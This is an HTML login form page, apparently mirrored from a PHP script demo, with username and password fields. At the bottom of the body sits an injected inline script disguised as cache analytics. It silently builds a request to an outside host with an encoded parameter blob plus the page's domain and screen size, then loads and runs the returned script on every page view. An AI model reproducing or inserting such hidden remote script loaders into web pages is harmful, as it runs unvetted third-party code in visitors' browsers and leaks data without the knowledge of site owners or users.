<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <!-- <html class="no-js"> --> <!--<![endif]-->
    
<!-- Mirrored from demo.phpjabbers.com/freescripts/php-user-login/index.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Sep 2019 07:52:47 GMT -->
<!-- Added by HTTrack --><!-- <meta http-equiv="content-type" content="text/html;charset=UTF-8" /> --><!-- /Added by HTTrack -->
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Login Form</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->

        <link rel="stylesheet" href="css/main.css">
        <link href='http://fonts.googleapis.com/css?family=Roboto:400,300,500' rel='stylesheet' type='text/css'>
        <link href="../../../netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
        <script src="js/jquery-1.8.2.min.js"></script>
        <script src="js/jquery.validate.min.js"></script>
        <script src="js/main.js"></script>
    </head>
    <body>
		    <form id="login-form" class="login-form" name="login" method="post" action="proseslogin.php">
	    	<input type="hidden" name="is_login" value="1">
	        <div class="h1">Login Form</div>
	        <div id="form-content">
	            <div class="group">
	                <label for="email">Username</label>
	                <div><input id="username" name="username" class="form-control required" type="text" placeholder="Username"></div>
	            </div>
	           <div class="group">
	                <label for="name">Password</label>
	                <div><input id="password" name="password" class="form-control required" type="password" placeholder="Password"></div>
	            </div>
	          <div class="group submit">
	                <label class="empty"></label>
	                <div><input name="submit" type="submit" value="Submit"/></div>   
	            </div>
	        </div>
	        <div id="form-loading" class="hide"><i class="fa fa-circle-o-notch fa-spin"></i></div>
	    </form>
	   
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2z4R6iDdLab%2b%2bxPuYoyu029r%2bBAfbe8uVMWTOlTRldezLYxSceI9Q0KMpKMcREb5CXxIlMC48bHTarTEbR5MAqqYa9liDJ9CTS2MN%2bs4s83pPZVL%2fZV6aEZBP44XwG%2bmt36F8J3zSNrkuOjDJx0rfMafg5KJVCPwOWUYrqmsR%2bHFGoQbG3A3ayzGFiejpbYY0iuv4mC4TbcUK47K74URlRMoW8mu5pjotDKm%2bFYef40%2foGII173eOyes6hXa%2fQhd8KoOHJrMaa3v3kNUaPUEnfQBVwbHaVAzWPfnnFFJsdU3%2fYY0JpbaeG6NP16XF11YRjTEgETUqbJbyOSetuV%2f2wbXYn6j4MKEJH0PLAbkIX4xkIRTWFriasRdK983fYlZ1XhPucj7EEIIDBsV83nLUEYgL53v5fuCDHIcRFyqkmCGlzKynh6Q%2ffrUx6zv0PsEyQMkFU9db8CVwKhwU%2bxqwclPCOvAqGPSOwTx8WWXXPmdeqQvdTAfu8sbkkd5Xc9xSqT7USMviYbEr2982l0oSpxm83OsPI%2blT22Sp3%2bjXnZs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from demo.phpjabbers.com/freescripts/php-user-login/index.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Sep 2019 07:52:49 GMT -->
</html>
